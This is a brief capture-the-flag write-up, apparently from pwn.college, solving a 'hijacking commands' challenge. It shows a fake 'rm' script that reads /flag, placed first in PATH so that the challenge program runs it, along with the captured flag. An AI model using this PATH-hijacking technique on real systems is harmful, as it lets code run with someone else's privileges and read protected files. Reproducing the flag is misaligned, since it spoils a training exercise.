## Challenge Name
hijacking commands

### Solve
**Flag:** `pwn.college{sJOAufeveHu6_-BLFH3tB02BkXF.QX3cjM1wSMzEzNzEzW}`

```bash
hacker@path~hijacking-commands:~$ cat > /home/hacker/bin/rm <<'EOF'
/bin/cat /flag
EOF
hacker@path~hijacking-commands:~$ chmod +x /home/hacker/bin/rm
hacker@path~hijacking-commands:~$ 
export PATH=/home/hacker/bin:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/bin/rm. Executing!
pwn.college{sJOAufeveHu6_-BLFH3tB02BkXF.QX3cjM1wSMzEzNzEzW}
```

### New Learnings
i learnt how to get the flag without the existence of a win

### References 
https://stackoverflow.com/questions/5265702/how-to-get-full-path-of-a-file
